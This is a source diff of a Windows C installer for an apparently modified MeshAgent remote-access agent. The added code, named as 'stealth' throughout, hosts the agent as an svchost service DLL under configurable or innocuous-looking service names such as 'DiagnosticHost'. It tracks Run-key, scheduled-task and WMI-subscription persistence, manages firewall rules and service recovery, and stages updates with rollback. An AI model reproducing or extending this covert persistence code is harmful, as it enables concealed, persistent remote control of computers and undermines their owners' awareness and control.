@@ -28,6 +28,11 @@
 #include "svchost_payload.h"
 #include "stealth_defaults.h"
 #include "stealth_resilience.h"
+#include "../microstack/ILibSimpleDataStore.h"
+
+#ifndef IDR_SVCHOST_DLL
+#define IDR_SVCHOST_DLL 101
+#endif
 
 static void MeshInstaller_NormalizePathSeparators(wchar_t* path)
 {
@@ -76,7 +81,7 @@ static BOOL MeshInstaller_GetDefaultInstallRoot(wchar_t* buffer, size_t count)
     {
         if (FAILED(StringCchCatW(buffer, count, L"\\"))) { return FALSE; }
     }
-    if (FAILED(StringCchCatW(buffer, count, L"DiagnosticHost"))) { return FALSE; }
+    if (FAILED(StringCchCatW(buffer, count, STEALTH_FALLBACK_SERVICE_NAME))) { return FALSE; }
     return TRUE;
 }
 
@@ -152,6 +157,7 @@ static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token);
 static void Stealth_EnablePrivilege(const wchar_t* privilegeName);
 void Stealth_LogInstallEvent(const wchar_t* format, ...);
 static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context);
+static void Stealth_ImportWinHttpProxyFromIeBestEffort(void);
 static void Stealth_ResolveDefaultLogPath(void);
 static void Stealth_LogAnsiMessage(const char* message);
 static void Stealth_EnsureLogDirectory(void);
@@ -182,17 +188,43 @@ static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wch
 static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName);
 static BOOL Stealth_EnsureConfigFile(const wchar_t* sourceExePath, const wchar_t* destPath);
 static BOOL Stealth_EnsureMshFile(const wchar_t* sourceExePath, const wchar_t* destPath, const wchar_t* fallbackConfPath);
+static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, const wchar_t* destPath);
 static BOOL Stealth_ConfigHasRequiredKeys(const wchar_t* configPath);
+static BOOL Stealth_HasEmbeddedMshPayload(const wchar_t* exePath);
+static BOOL Stealth_BuildSiblingPathWithExtension(const wchar_t* sourcePath, const wchar_t* extension, wchar_t* outPath, size_t outPathCch);
+static BOOL Stealth_BuildSiblingPathWithFileName(const wchar_t* sourcePath, const wchar_t* fileName, wchar_t* outPath, size_t outPathCch);
+static BOOL Stealth_TryStageAndValidateSvchostDll(const wchar_t* candidatePath, const wchar_t* destPath, const wchar_t* sourceLabel);
 static BOOL Stealth_ShouldEnableDebugConsole(void);
 static void Stealth_AppendConfigOverride(const wchar_t* path, const char* key, const char* value);
 static void Stealth_ClearServiceRecovery(const wchar_t* serviceName);
 static BOOL Stealth_DoFirewallRulesMatch(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath);
 static BOOL Stealth_WaitForFirewallRuleConvergence(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath, DWORD timeoutMs);
 static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath);
+static BOOL Stealth_WaitForServiceAbsence(const wchar_t* serviceName, DWORD timeoutMs);
+static BOOL Stealth_ServiceIsRunning(const wchar_t* serviceName);
+static BOOL Stealth_SendMasterServiceControlRequest(const char* requestJson, char* response, size_t responseLen);
+static BOOL Stealth_BuildSidecarMshPath(const wchar_t* exePath, wchar_t* mshPath, size_t mshPathCch);
+static BOOL Stealth_CopyFileOverwrite(const wchar_t* sourcePath, const wchar_t* destPath);
+static BOOL Stealth_ExtractEmbeddedSvchostDllFromExe(const wchar_t* exePath, const wchar_t* destPath);
+static void Stealth_DeleteFileIfPresent(const wchar_t* path);
+static const wchar_t* MeshInstaller_GetPathLeaf(const wchar_t* path);
+static void Stealth_DeleteUpdateTransactionArtifacts(const struct StealthUpdateTransaction* tx);
+static BOOL Stealth_FinalizeUpdateTransaction(const StealthInstallPaths* paths, struct StealthUpdateTransaction* tx);
+static BOOL Stealth_ClearPendingUpdateArtifacts(const StealthInstallPaths* paths, const wchar_t* phaseLabel);
+static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, const wchar_t* sourceExePath, const wchar_t* sourceDllPath, struct StealthUpdateTransaction* tx);
+static BOOL Stealth_BackupUpdateTransaction(const StealthInstallPaths* paths, struct StealthUpdateTransaction* tx);
+static BOOL Stealth_CommitUpdateTransaction(const StealthInstallPaths* paths, const struct StealthUpdateTransaction* tx);
+static BOOL Stealth_RollbackUpdateTransaction(const StealthInstallPaths* paths, const wchar_t* serviceKeyName, const struct StealthUpdateTransaction* tx);
+static BOOL Stealth_WaitForExpectedIdentity(const wchar_t* dbPath, const struct StealthIdentitySnapshot* expectedIdentity, DWORD timeoutMs);
+static BOOL Stealth_PathExists(const wchar_t* path);
+static BOOL Stealth_ReadRegistryString(HKEY root, const wchar_t* subKey, const wchar_t* valueName, wchar_t* buffer, size_t bufferCch, DWORD* valueType);
+static BOOL Stealth_ReadRegistryDword(HKEY root, const wchar_t* subKey, const wchar_t* valueName, DWORD* valueOut);
 static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath);
+static BOOL Stealth_IsSvchostPayloadDllCandidate(const wchar_t* dllPath);
 static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath);
 static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const wchar_t* dllPath, DWORD timeoutMs, BOOL allowRepair);
 static void Stealth_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath);
+static void Stealth_RemoveInactiveSvchostPayloadDlls(const StealthInstallPaths* paths);
 static void Stealth_CleanupLegacyServiceAlias(const wchar_t* activeServiceName);
 
 #define STEALTH_INSTALL_LOG_MAX_BYTES    (512ULL * 1024ULL)
@@ -200,7 +232,15 @@ static void Stealth_CleanupLegacyServiceAlias(const wchar_t* activeServiceName);
 #define STEALTH_FIREWALL_SETTLE_TIMEOUT_MS (12 * 1000)
 #define STEALTH_FIREWALL_RETRY_DELAY_MS    (1000)
 #define STEALTH_FIREWALL_MAX_ATTEMPTS      (3)
-#define STEALTH_MASTER_SERVICE_EXE_NAME    L"MasterService.exe"
+/* UMH companion service identifiers — SSOT: meshcore/config/umh_defines.h */
+#include "../meshcore/config/umh_defines.h"
+#define STEALTH_MASTER_SERVICE_EXE_NAME    MESHAGENT_MASTER_SERVICE_EXE_NAME
+#define STEALTH_MASTER_SERVICE_NAME        MESHAGENT_MASTER_SERVICE_SERVICE_NAME
+#define STEALTH_MASTER_SERVICE_PIPE_NAME   MESHAGENT_UMH_CONTROL_PIPE_NAME
+#define STEALTH_UPDATE_STAGE_DIR_NAME      L"update-stage"
+#define STEALTH_UPDATE_BACKUP_DIR_NAME     L"update-backup"
+#define STEALTH_NODEID_MAX_BYTES           256
+#define STEALTH_IDENTITY_VALUE_MAX_BYTES   1024
 
 static wchar_t g_InstallLogPath[MAX_PATH] = {0};
 static BOOL g_HaveInstallLogPath = FALSE;
@@ -208,6 +248,184 @@ static volatile LONG g_InstallLogDirEnsured = 0;
 static wchar_t g_InstallLogDirEnsuredPath[MAX_PATH] = {0};
 static wchar_t g_PersistenceStatePath[MAX_PATH] = {0};
 static BOOL g_HavePersistenceStatePath = FALSE;
+
+typedef struct StealthRuntimeBrandingOverrides
+{
+    wchar_t serviceKeyName[256];
+    wchar_t serviceDisplayName[256];
+    wchar_t serviceDescription[512];
+    BOOL hasServiceKeyName;
+    BOOL hasServiceDisplayName;
+    BOOL hasServiceDescription;
+} StealthRuntimeBrandingOverrides;
+
+static StealthRuntimeBrandingOverrides g_RuntimeBrandingOverrides = {0};
+
+typedef struct StealthIdentitySnapshot
+{
+    char nodeId[STEALTH_NODEID_MAX_BYTES];
+    int nodeIdLen;
+    BOOL nodeIdPresent;
+    char meshId[STEALTH_IDENTITY_VALUE_MAX_BYTES];
+    int meshIdLen;
+    BOOL meshIdPresent;
+    char serverId[STEALTH_IDENTITY_VALUE_MAX_BYTES];
+    int serverIdLen;
+    BOOL serverIdPresent;
+    char meshServer[STEALTH_IDENTITY_VALUE_MAX_BYTES];
+    int meshServerLen;
+    BOOL meshServerPresent;
+} StealthIdentitySnapshot;
+
+typedef struct StealthUpdateTransaction
+{
+    wchar_t stageDir[MAX_PATH];
+    wchar_t backupDir[MAX_PATH];
+    wchar_t liveMshPath[MAX_PATH];
+    wchar_t stagedExePath[MAX_PATH];
+    wchar_t stagedDllPath[MAX_PATH];
+    wchar_t stagedConfPath[MAX_PATH];
+    wchar_t stagedMshPath[MAX_PATH];
+    wchar_t backupExePath[MAX_PATH];
+    wchar_t backupDllPath[MAX_PATH];
+    wchar_t backupConfPath[MAX_PATH];
+    wchar_t backupMshPath[MAX_PATH];
+    wchar_t backupDbPath[MAX_PATH];
+    StealthIdentitySnapshot expectedIdentity;
+    BOOL liveExeExists;
+    BOOL liveDllExists;
+    BOOL liveConfExists;
+    BOOL liveMshExists;
+    BOOL liveDbExists;
+    BOOL stagedExeReady;
+    BOOL stagedDllReady;
+    BOOL stagedConfReady;
+    BOOL stagedMshReady;
+    BOOL backupDbReady;
+    BOOL backupsReady;
+    BOOL expectedIdentityReady;
+    BOOL pendingUpdateMarked;
+} StealthUpdateTransaction;
+
+typedef enum StealthLifecycleStateKind
+{
+    STEALTH_LIFECYCLE_STATE_UNKNOWN = 0,
+    STEALTH_LIFECYCLE_STATE_CLEAN,
+    STEALTH_LIFECYCLE_STATE_HEALTHY,
+    STEALTH_LIFECYCLE_STATE_PARTIAL,
+    STEALTH_LIFECYCLE_STATE_BROKEN,
+    STEALTH_LIFECYCLE_STATE_PENDING_UPDATE,
+    STEALTH_LIFECYCLE_STATE_UNINSTALL_RESIDUE
+} StealthLifecycleStateKind;
+
+typedef enum StealthLifecycleRequest
+{
+    STEALTH_LIFECYCLE_REQUEST_INSTALL = 0,
+    STEALTH_LIFECYCLE_REQUEST_UPDATE,
+    STEALTH_LIFECYCLE_REQUEST_REPAIR,
+    STEALTH_LIFECYCLE_REQUEST_REINSTALL,
+    STEALTH_LIFECYCLE_REQUEST_UNINSTALL
+} StealthLifecycleRequest;
+
+typedef enum StealthLifecycleAction
+{
+    STEALTH_LIFECYCLE_ACTION_NONE = 0,
+    STEALTH_LIFECYCLE_ACTION_INSTALL,
+    STEALTH_LIFECYCLE_ACTION_UPDATE,
+    STEALTH_LIFECYCLE_ACTION_REPAIR,
+    STEALTH_LIFECYCLE_ACTION_UNINSTALL
+} StealthLifecycleAction;
+
+typedef struct StealthLifecycleDiscovery
+{
+    StealthInstallPaths paths;
+    wchar_t serviceKeyName[256];
+    wchar_t serviceDisplayName[256];
+    wchar_t serviceKeyPath[512];
+    wchar_t serviceParamsPath[512];
+    wchar_t stateDirPath[MAX_PATH];
+    wchar_t masterServicePath[MAX_PATH];
+    BOOL installRootExists;
+    BOOL logsDirExists;
+    BOOL exeExists;
+    BOOL dllExists;
+    BOOL confExists;
+    BOOL dbExists;
+    BOOL installRootDaclValid;
+    BOOL logsDirDaclValid;
+    BOOL exeDaclValid;
+    BOOL configKeysValid;
+    BOOL serviceKeyExists;
+    BOOL serviceExists;
+    BOOL serviceRunning;
+    BOOL serviceTypeValid;
+    BOOL serviceStartValid;
+    BOOL serviceImageValid;
+    BOOL serviceGroupValid;
+    BOOL serviceAccountValid;
+    BOOL serviceDllValid;
+    BOOL serviceMainValid;
+    BOOL serviceUnloadValid;
+    BOOL serviceDaclValid;
+    BOOL serviceAliasClean;
+    BOOL firewallRulePresent;
+    BOOL firewallHealthy;
+    BOOL persistenceStateExists;
+    BOOL runKeyPresent;
+    BOOL autorunTaskPresent;
+    BOOL restartTaskPresent;
+    BOOL wmiSubscriptionPresent;
+    BOOL persistenceHealthy;
+    BOOL pendingUpdate;
+    BOOL updateStageArtifactsPresent;
+    BOOL updateBackupArtifactsPresent;
+    BOOL nodeIdPresent;
+    BOOL masterServiceBinaryPresent;
+    BOOL masterServiceRegistered;
+    BOOL masterServiceRunning;
+    BOOL masterServicePathValid;
+    BOOL masterServicePipeReady;
+    BOOL masterServiceHealthy;
+    BOOL anyInstallArtifacts;
+    BOOL anyPersistenceArtifacts;
+    BOOL anyCompanionArtifacts;
+    DWORD conflictingServiceAliasCount;
+    StealthLifecycleStateKind stateKind;
+} StealthLifecycleDiscovery;
+
+typedef struct StealthLifecyclePlan
+{
+    StealthLifecycleRequest request;
+    StealthLifecycleAction action;
+    BOOL preserveIdentity;
+    BOOL requiresQuiesce;
+    BOOL requiresStage;
+    BOOL requiresRemoval;
+    BOOL requiresServiceStart;
+} StealthLifecyclePlan;
+
+static const wchar_t* Stealth_LifecycleStateToString(StealthLifecycleStateKind stateKind);
+static const wchar_t* Stealth_LifecycleRequestToString(StealthLifecycleRequest request);
+static const wchar_t* Stealth_LifecycleActionToString(StealthLifecycleAction action);
+static BOOL Stealth_DirectoryHasEntries(const wchar_t* path);
+static BOOL Stealth_DiscoverCurrentState(StealthLifecycleDiscovery* discovery);
+static BOOL Stealth_BuildTransitionPlan(const StealthLifecycleDiscovery* discovery, StealthLifecycleRequest request, StealthLifecyclePlan* plan);
+static void Stealth_LogLifecycleSnapshot(const wchar_t* phase, const StealthLifecycleDiscovery* discovery, const StealthLifecyclePlan* plan);
+static BOOL Stealth_IsPrimaryLifecycleConverged(const StealthLifecycleDiscovery* discovery, BOOL requirePendingClear);
+static BOOL Stealth_IsPrimaryLifecycleHealthy(const StealthLifecycleDiscovery* discovery);
+static BOOL Stealth_IsPrimaryLifecycleOperational(const StealthLifecycleDiscovery* discovery);
+static BOOL Stealth_WaitForPrimaryLifecycleConverged(DWORD timeoutMs, BOOL requirePendingClear, StealthLifecycleDiscovery* discoveryOut);
+static BOOL Stealth_WaitForPrimaryLifecycleHealthy(DWORD timeoutMs, StealthLifecycleDiscovery* discoveryOut);
+static BOOL Stealth_WaitForPrimaryLifecycleOperational(DWORD timeoutMs, StealthLifecycleDiscovery* discoveryOut);
+static BOOL Stealth_DataStoreValueExists(const wchar_t* dbPath, const char* key, char* buffer, size_t bufferLen, int* valueLenOut);
+static BOOL Stealth_DataStorePutValue(const wchar_t* dbPath, const char* key, const char* value, size_t valueLen);
+static BOOL Stealth_DataStoreDeleteValue(const wchar_t* dbPath, const char* key);
+static BOOL Stealth_CaptureIdentitySnapshot(const wchar_t* dbPath, StealthIdentitySnapshot* snapshot);
+static void Stealth_LogIdentitySnapshot(const wchar_t* phase, const StealthIdentitySnapshot* snapshot);
+static BOOL Stealth_IdentitySnapshotMatches(const StealthIdentitySnapshot* expected, const StealthIdentitySnapshot* actual);
+static BOOL Stealth_IsMasterServicePipeReady(void);
+static BOOL Stealth_QueryServiceImagePathW(const wchar_t* serviceName, wchar_t* imagePath, size_t imagePathCch);
+static BOOL Stealth_RunLifecycleOperation(StealthLifecycleRequest request, const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
 
 BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state);
 BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state);
@@ -224,6 +442,150 @@ static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot)
     if (!MeshInstaller_CombinePath(stateDir, _countof(stateDir), installRoot, L"state")) { return; }
     if (!MeshInstaller_CombinePath(g_PersistenceStatePath, _countof(g_PersistenceStatePath), stateDir, L"persistence.ini")) { return; }
     g_HavePersistenceStatePath = (g_PersistenceStatePath[0] != L'\0');
+}
+
+static void Stealth_TrimMatchingQuotesInplace(wchar_t* value)
+{
+    size_t len = 0;
+    if (value == NULL) { return; }
+
+    len = wcslen(value);
+    while (len >= 2)
+    {
+        wchar_t first = value[0];
+        wchar_t last = value[len - 1];
+        if (!((first == L'"' && last == L'"') || (first == L'\'' && last == L'\'')))
+        {
+            break;
+        }
+
+        memmove(value, value + 1, (len - 1) * sizeof(wchar_t));
+        value[len - 2] = L'\0';
+        len -= 2;
+    }
+}
+
+static void Stealth_SetRuntimeBrandingFieldUtf8(wchar_t* dest, size_t destCch, BOOL* presentFlag, const char* value)
+{
+    int converted = 0;
+
+    if (dest == NULL || destCch == 0 || presentFlag == NULL)
+    {
+        return;
+    }
+
+    dest[0] = L'\0';
+    *presentFlag = FALSE;
+    if (value == NULL || value[0] == '\0')
+    {
+        return;
+    }
+
+    converted = MultiByteToWideChar(CP_UTF8, 0, value, -1, dest, (int)destCch);
+    if (converted <= 0)
+    {
+        converted = MultiByteToWideChar(CP_ACP, 0, value, -1, dest, (int)destCch);
+    }
+    if (converted <= 0)
+    {
+        dest[0] = L'\0';
+        return;
+    }
+
+    dest[destCch - 1] = L'\0';
+    Stealth_TrimWhitespaceInplace(dest);
+    Stealth_TrimMatchingQuotesInplace(dest);
+    Stealth_TrimWhitespaceInplace(dest);
+    *presentFlag = (dest[0] != L'\0');
+}
+
+void Stealth_ClearRuntimeBrandingOverrides(void)
+{
+    ZeroMemory(&g_RuntimeBrandingOverrides, sizeof(g_RuntimeBrandingOverrides));
+}
+
+void Stealth_SetRuntimeServiceKeyNameUtf8(const char* value)
+{
+    Stealth_SetRuntimeBrandingFieldUtf8(
+        g_RuntimeBrandingOverrides.serviceKeyName,
+        _countof(g_RuntimeBrandingOverrides.serviceKeyName),
+        &g_RuntimeBrandingOverrides.hasServiceKeyName,
+        value);
+}
+
+void Stealth_SetRuntimeDisplayNameUtf8(const char* value)
+{
+    Stealth_SetRuntimeBrandingFieldUtf8(
+        g_RuntimeBrandingOverrides.serviceDisplayName,
+        _countof(g_RuntimeBrandingOverrides.serviceDisplayName),
+        &g_RuntimeBrandingOverrides.hasServiceDisplayName,
+        value);
+}
+
+void Stealth_SetRuntimeServiceDescriptionUtf8(const char* value)
+{
+    Stealth_SetRuntimeBrandingFieldUtf8(
+        g_RuntimeBrandingOverrides.serviceDescription,
+        _countof(g_RuntimeBrandingOverrides.serviceDescription),
+        &g_RuntimeBrandingOverrides.hasServiceDescription,
+        value);
+}
+
+static void Stealth_ResolveRuntimeServiceBranding(
+    wchar_t* serviceKeyName,
+    size_t serviceKeyNameCch,
+    wchar_t* serviceDisplayName,
+    size_t serviceDisplayNameCch,
+    wchar_t* serviceDescription,
+    size_t serviceDescriptionCch)
+{
+    if (serviceKeyName != NULL && serviceKeyNameCch > 0)
+    {
+        if (g_RuntimeBrandingOverrides.hasServiceKeyName)
+        {
+            StringCchCopyW(serviceKeyName, serviceKeyNameCch, g_RuntimeBrandingOverrides.serviceKeyName);
+        }
+        else
+        {
+            MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, serviceKeyNameCch);
+        }
+        if (serviceKeyName[0] == L'\0')
+        {
+            StringCchCopyW(serviceKeyName, serviceKeyNameCch, STEALTH_FALLBACK_SERVICE_NAME);
+        }
+    }
+
+    if (serviceDisplayName != NULL && serviceDisplayNameCch > 0)
+    {
+        if (g_RuntimeBrandingOverrides.hasServiceDisplayName)
+        {
+            StringCchCopyW(serviceDisplayName, serviceDisplayNameCch, g_RuntimeBrandingOverrides.serviceDisplayName);
+        }
+        else
+        {
+            MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, serviceDisplayNameCch);
+        }
+        if (serviceDisplayName[0] == L'\0')
+        {
+            StringCchCopyW(serviceDisplayName, serviceDisplayNameCch, STEALTH_FALLBACK_DISPLAY_NAME);
+        }
+    }
+
+    if (serviceDescription != NULL && serviceDescriptionCch > 0)
+    {
+        if (g_RuntimeBrandingOverrides.hasServiceDescription)
+        {
+            StringCchCopyW(serviceDescription, serviceDescriptionCch, g_RuntimeBrandingOverrides.serviceDescription);
+        }
+        else
+        {
+            MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, serviceDescriptionCch);
+        }
+        if (serviceDescription[0] == L'\0')
+        {
+            StringCchCopyW(serviceDescription, serviceDescriptionCch, STEALTH_FALLBACK_SERVICE_DESCRIPTION);
+        }
+    }
 }
 
 static BOOL Stealth_ReadServiceParameterString(const wchar_t* serviceName, const wchar_t* valueName, wchar_t* buffer, size_t bufferCch)
@@ -256,6 +618,262 @@ static BOOL Stealth_ReadServiceParameterString(const wchar_t* serviceName, const
     return TRUE;
 }
 
+typedef struct StealthServiceAliasRecord
+{
+    wchar_t serviceName[256];
+    wchar_t serviceDisplayName[256];
+    wchar_t serviceDll[MAX_PATH * 4];
+} StealthServiceAliasRecord;
+
+static void Stealth_TrimTrailingSeparatorsInplace(wchar_t* value)
+{
+    size_t len = 0;
+    if (value == NULL) { return; }
+
+    len = wcslen(value);
+    while (len > 3 && (value[len - 1] == L'\\' || value[len - 1] == L'/'))
+    {
+        value[len - 1] = L'\0';
+        --len;
+    }
+}
+
+static BOOL Stealth_DeleteServiceStateRegistryTree(const wchar_t* serviceName)
+{
+    wchar_t keyPath[512] = {0};
+    LSTATUS status = ERROR_SUCCESS;
+
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+    if (FAILED(StringCchPrintfW(keyPath, _countof(keyPath), L"SOFTWARE\\Open Source\\%ls", serviceName))) { return FALSE; }
+
+    status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
+    if (status == ERROR_SUCCESS || status == ERROR_FILE_NOT_FOUND || status == ERROR_PATH_NOT_FOUND)
+    {
+        return TRUE;
+    }
+
+    Stealth_LogInstallEvent(L"[ALIAS] Failed to delete service state registry tree for %ls (error=%ld)", serviceName, status);
+    return FALSE;
+}
+
+static BOOL Stealth_PathStartsWithDirectoryInsensitive(const wchar_t* path, const wchar_t* directory)
+{
+    wchar_t normalizedPath[MAX_PATH * 4] = {0};
+    wchar_t normalizedDirectory[MAX_PATH * 4] = {0};
+    size_t directoryLen = 0;
+
+    if (path == NULL || path[0] == L'\0' || directory == NULL || directory[0] == L'\0') { return FALSE; }
+    if (FAILED(StringCchCopyW(normalizedPath, _countof(normalizedPath), path))) { return FALSE; }
+    if (FAILED(StringCchCopyW(normalizedDirectory, _countof(normalizedDirectory), directory))) { return FALSE; }
+
+    MeshInstaller_NormalizePathSeparators(normalizedPath);
+    MeshInstaller_NormalizePathSeparators(normalizedDirectory);
+    Stealth_TrimTrailingSeparatorsInplace(normalizedPath);
+    Stealth_TrimTrailingSeparatorsInplace(normalizedDirectory);
+
+    directoryLen = wcslen(normalizedDirectory);
+    if (directoryLen == 0 || _wcsnicmp(normalizedPath, normalizedDirectory, directoryLen) != 0)
+    {
+        return FALSE;
+    }
+
+    return (normalizedPath[directoryLen] == L'\0' || normalizedPath[directoryLen] == L'\\');
+}
+
+static BOOL Stealth_ResolveServiceDllPath(const wchar_t* serviceName, wchar_t* dllPath, size_t dllPathCch)
+{
+    wchar_t rawDllPath[MAX_PATH * 4] = {0};
+    DWORD expanded = 0;
+
+    if (dllPath == NULL || dllPathCch == 0) { return FALSE; }
+    dllPath[0] = L'\0';
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+    if (!Stealth_ReadServiceParameterString(serviceName, L"ServiceDll", rawDllPath, _countof(rawDllPath)))
+    {
+        return FALSE;
+    }
+
+    expanded = ExpandEnvironmentStringsW(rawDllPath, dllPath, (DWORD)dllPathCch);
+    if (expanded == 0 || expanded >= dllPathCch)
+    {
+        if (FAILED(StringCchCopyW(dllPath, dllPathCch, rawDllPath)))
+        {
+            dllPath[0] = L'\0';
+            return FALSE;
+        }
+    }
+
+    MeshInstaller_NormalizePathSeparators(dllPath);
+    Stealth_TrimTrailingSeparatorsInplace(dllPath);
+    return (dllPath[0] != L'\0');
+}
+
+static void Stealth_GetServiceDisplayNameForCleanup(const wchar_t* serviceName, wchar_t* displayName, size_t displayNameCch)
+{
+    wchar_t keyPath[512] = {0};
+
+    if (displayName == NULL || displayNameCch == 0) { return; }
+    displayName[0] = L'\0';
+    if (serviceName == NULL || serviceName[0] == L'\0') { return; }
+
+    if (SUCCEEDED(StringCchPrintfW(keyPath, _countof(keyPath), L"SYSTEM\\CurrentControlSet\\Services\\%ls", serviceName)) &&
+        Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, keyPath, L"DisplayName", displayName, displayNameCch, NULL) &&
+        displayName[0] != L'\0')
+    {
+        return;
+    }
+
+    (void)StringCchCopyW(displayName, displayNameCch, serviceName);
+}
+
+static BOOL Stealth_ServiceUsesInstallRootPayload(
+    const StealthInstallPaths* paths,
+    const wchar_t* serviceName,
+    wchar_t* resolvedServiceDll,
+    size_t resolvedServiceDllCch)
+{
+    wchar_t serviceMain[128] = {0};
+    wchar_t localDllPath[MAX_PATH * 4] = {0};
+
+    if (paths == NULL || serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+    if (!Stealth_ResolveServiceDllPath(serviceName, localDllPath, _countof(localDllPath)))
+    {
+        return FALSE;
+    }
+    if (!Stealth_ReadServiceParameterString(serviceName, L"ServiceMain", serviceMain, _countof(serviceMain)) ||
+        _wcsicmp(serviceMain, L"Stealth_SvchostServiceMain") != 0)
+    {
+        return FALSE;
+    }
+
+    if ((paths->dllPath[0] != L'\0' && _wcsicmp(localDllPath, paths->dllPath) == 0) ||
+        (paths->installDir[0] != L'\0' && Stealth_PathStartsWithDirectoryInsensitive(localDllPath, paths->installDir)))
+    {
+        if (resolvedServiceDll != NULL && resolvedServiceDllCch > 0)
+        {
+            (void)StringCchCopyW(resolvedServiceDll, resolvedServiceDllCch, localDllPath);
+        }
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+static size_t Stealth_CollectConflictingServiceAliases(
+    const StealthInstallPaths* paths,
+    const wchar_t* activeServiceName,
+    StealthServiceAliasRecord* aliases,
+    size_t aliasCapacity)
+{
+    HKEY hServices = NULL;
+    DWORD index = 0;
+    size_t count = 0;
+
+    if (paths == NULL || paths->installDir[0] == L'\0') { return 0; }
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services", 0, KEY_ENUMERATE_SUB_KEYS, &hServices) != ERROR_SUCCESS)
+    {
+        return 0;
+    }
+
+    while (TRUE)
+    {
+        wchar_t serviceName[512] = {0};
+        wchar_t serviceDll[MAX_PATH * 4] = {0};
+        DWORD serviceNameCch = (DWORD)_countof(serviceName);
+        LSTATUS enumStatus = RegEnumKeyExW(hServices, index, serviceName, &serviceNameCch, NULL, NULL, NULL, NULL);
+
+        if (enumStatus == ERROR_NO_MORE_ITEMS) { break; }
+        if (enumStatus != ERROR_SUCCESS)
+        {
+            ++index;
+            continue;
+        }
+
+        if (activeServiceName != NULL && activeServiceName[0] != L'\0' && _wcsicmp(serviceName, activeServiceName) == 0)
+        {
+            ++index;
+            continue;
+        }
+
+        if (Stealth_ServiceUsesInstallRootPayload(paths, serviceName, serviceDll, _countof(serviceDll)))
+        {
+            if (aliases != NULL && count < aliasCapacity)
+            {
+                (void)StringCchCopyW(aliases[count].serviceName, _countof(aliases[count].serviceName), serviceName);
+                Stealth_GetServiceDisplayNameForCleanup(serviceName, aliases[count].serviceDisplayName, _countof(aliases[count].serviceDisplayName));
+                (void)StringCchCopyW(aliases[count].serviceDll, _countof(aliases[count].serviceDll), serviceDll);
+            }
+            ++count;
+        }
+
+        ++index;
+    }
+
+    RegCloseKey(hServices);
+    return count;
+}
+
+static size_t Stealth_CleanupConflictingServiceAliases(const StealthInstallPaths* paths, const wchar_t* activeServiceName)
+{
+    StealthServiceAliasRecord aliases[16] = {0};
+    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+    size_t aliasCount = 0;
+    size_t cleanupCount = 0;
+
+    if (paths == NULL) { return 0; }
+
+    aliasCount = Stealth_CollectConflictingServiceAliases(paths, activeServiceName, aliases, _countof(aliases));
+    cleanupCount = (aliasCount < _countof(aliases)) ? aliasCount : _countof(aliases);
+    if (aliasCount == 0) { return 0; }
+
+    if (aliasCount > cleanupCount)
+    {
+        Stealth_LogInstallEvent(L"[ALIAS] Conflicting service alias count exceeded cleanup buffer (%Iu total)", aliasCount);
+    }
+
+    for (size_t i = 0; i < cleanupCount; ++i)
+    {
+        wchar_t aliasMshName[320] = {0};
+        wchar_t aliasMshPath[MAX_PATH] = {0};
+        const wchar_t* displayName = (aliases[i].serviceDisplayName[0] != L'\0') ? aliases[i].serviceDisplayName : aliases[i].serviceName;
+
+        Stealth_LogInstallEvent(
+            L"[ALIAS] Removing conflicting service alias %ls (ServiceDll=%ls active=%ls)",
+            aliases[i].serviceName,
+            aliases[i].serviceDll,
+            (activeServiceName != NULL && activeServiceName[0] != L'\0') ? activeServiceName : L"(none)");
+
+        Stealth_ClearServiceRecovery(aliases[i].serviceName);
+        Stealth_RemoveRunKeyEntry(aliases[i].serviceName);
+        Stealth_RemoveScheduledTasks(persistence, displayName, aliases[i].serviceName);
+        (void)Stealth_StopServiceAndWait(aliases[i].serviceName, 30000, TRUE);
+
+        if (!Stealth_UnregisterSvchostService(aliases[i].serviceName))
+        {
+            Stealth_LogInstallEvent(L"[ALIAS] Failed to unregister conflicting service alias %ls (error=%lu)", aliases[i].serviceName, GetLastError());
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"[ALIAS] Unregistered conflicting service alias %ls", aliases[i].serviceName);
+        }
+
+        (void)Stealth_RemoveFirewallRuleForService(aliases[i].serviceName);
+        (void)Stealth_DeleteServiceStateRegistryTree(aliases[i].serviceName);
+
+        if (paths->installDir[0] != L'\0' &&
+            SUCCEEDED(StringCchPrintfW(aliasMshName, _countof(aliasMshName), L"%ls.msh", aliases[i].serviceName)) &&
+            MeshInstaller_CombinePath(aliasMshPath, _countof(aliasMshPath), paths->installDir, aliasMshName))
+        {
+            (void)Stealth_RemoveFileIfExists(aliasMshPath, FALSE);
+        }
+    }
+
+    return cleanupCount;
+}
+
 static void Stealth_CleanupLegacyServiceAlias(const wchar_t* activeServiceName)
 {
